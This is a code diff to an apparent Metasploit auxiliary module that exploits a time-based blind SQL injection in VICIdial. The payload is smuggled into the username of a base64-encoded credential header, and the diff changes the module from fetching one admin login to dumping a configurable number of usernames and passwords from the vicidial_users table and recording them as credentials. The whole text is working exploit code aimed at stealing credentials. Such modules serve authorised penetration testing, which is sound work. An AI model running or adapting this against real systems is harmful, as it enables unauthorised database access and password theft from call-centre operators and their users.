@@ -34,7 +34,8 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RHOST(),
         Opt::RPORT(80),
         OptString.new('TARGETURI', [true, 'Base path of the VICIdial instance', '/']),
-        OptInt.new('SqliDelay', [true, 'Delay in seconds for SQL Injection sleep', 1])
+        OptInt.new('SqliDelay', [true, 'Delay in seconds for SQL Injection sleep', 1]),
+        OptInt.new('COUNT', [true, 'Number of records to dump', 1])
       ]
     )
   end
@@ -47,23 +48,28 @@ class MetasploitModule < Msf::Auxiliary
 
     print_good('Target is vulnerable to SQL injection.')
 
-    admin_credentials = retrieve_admin_credentials
-    return print_error('Failed to retrieve admin credentials.') unless admin_credentials
+    columns = ['User', 'Pass']
+    data = @sqli.dump_table_fields('vicidial_users', columns, '', datastore['COUNT'])
 
-    print_good("Admin username: #{admin_credentials[:username]}")
-    print_good("Admin password: #{admin_credentials[:password]}")
-  end
-
-  def retrieve_admin_credentials
-    username_query = "SELECT user FROM vicidial_users WHERE user_level = 9 AND modify_same_user_level = '1' LIMIT 1"
-    admin_username = @sqli.run_sql(username_query)
-    return unless admin_username
-
-    password_query = "SELECT pass FROM vicidial_users WHERE user = '#{admin_username}' LIMIT 1"
-    admin_password = @sqli.run_sql(password_query)
-    return unless admin_password
-
-    { username: admin_username, password: admin_password }
+    table = Rex::Text::Table.new('Header' => 'vicidial_users', 'Indent' => 4, 'Columns' => columns)
+    data.each do |user|
+      create_credential({
+        workspace_id: myworkspace_id,
+        origin_type: :service,
+        module_fullname: fullname,
+        username: user[0],
+        private_type: :password,
+        private_data: user[1],
+        service_name: 'VICIdial',
+        address: datastore['RHOSTS'],
+        port: datastore['RPORT'],
+        protocol: 'tcp',
+        status: Metasploit::Model::Login::Status::UNTRIED
+      })
+      table << user
+    end
+    print_good('Dumped table contents:')
+    print_line(table.to_s)
   end
 
   def setup_sqli
@@ -71,10 +77,11 @@ class MetasploitModule < Msf::Auxiliary
       dbms: MySQLi::TimeBasedBlind,
       opts: { hex_encode_strings: true }
     ) do |payload|
-      random_username = Rex::Text.rand_text_alphanumeric(8)
+      random_username = Rex::Text.rand_text_alphanumeric(6, 8)
+      random_password = Rex::Text.rand_text_alphanumeric(6, 8)
 
       username = "#{random_username}', '', (#{payload}));# "
-      credentials = "#{username}:password"
+      credentials = "#{username}:#{random_password}"
       credentials_base64 = Rex::Text.encode_base64(credentials)
 
       send_request_cgi({
